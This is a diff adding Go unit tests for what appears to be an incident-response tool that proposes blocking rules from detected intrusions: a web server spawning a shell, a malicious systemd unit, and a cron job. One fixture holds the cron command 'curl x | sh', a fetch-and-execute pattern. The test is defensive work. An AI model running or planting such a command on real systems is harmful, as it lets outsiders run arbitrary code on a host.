@@ -79,3 +79,52 @@ func TestFromIncident(t *testing.T) {
 		t.Errorf("detail %d bytes", len(rs[0].Detail))
 	}
 }
+
+func TestFromIncident_Parent(t *testing.T) {
+	in := egressKill()
+	in.Kind, in.Exe = "service-shell", "/usr/bin/dash"
+	in.Chain = []incident.ProcRef{{PID: 11, Exe: "/usr/bin/dash"}, {PID: 10, Exe: "/usr/sbin/apache2"}}
+	var got *Rule
+	for _, r := range FromIncident(in, false) {
+		if r.Kind == "parent" {
+			got = &r
+		}
+	}
+	if got == nil || got.ParentExe != "/usr/sbin/apache2" || got.Exe != "/usr/bin/dash" || got.ID == "" {
+		t.Fatalf("%+v", got)
+	}
+	eg := egressKill()
+	eg.Chain = in.Chain
+	for _, r := range FromIncident(eg, false) {
+		if r.Kind == "parent" {
+			t.Fatalf("egress proposed %+v", r)
+		}
+	}
+	in.Chain = in.Chain[:1]
+	for _, r := range FromIncident(in, false) {
+		if r.Kind == "parent" {
+			t.Fatalf("no parent, proposed %+v", r)
+		}
+	}
+}
+
+func TestFromIncident_UnitAndCron(t *testing.T) {
+	in := egressKill()
+	in.Origin, in.OriginSHA256, in.Cron = "unit:evil.service", sum, "curl x | sh"
+	kinds := map[string]Rule{}
+	for _, r := range FromIncident(in, false) {
+		kinds[r.Kind] = r
+	}
+	if u := kinds["unit"]; u.Unit != "evil.service" || u.SHA256 != sum {
+		t.Errorf("unit %+v", u)
+	}
+	if c := kinds["cron"]; c.Command != "curl x | sh" {
+		t.Errorf("cron %+v", c)
+	}
+	in.OriginSHA256, in.Cron = "", ""
+	for _, r := range FromIncident(in, false) {
+		if r.Kind == "unit" || r.Kind == "cron" {
+			t.Errorf("proposed %+v", r)
+		}
+	}
+}
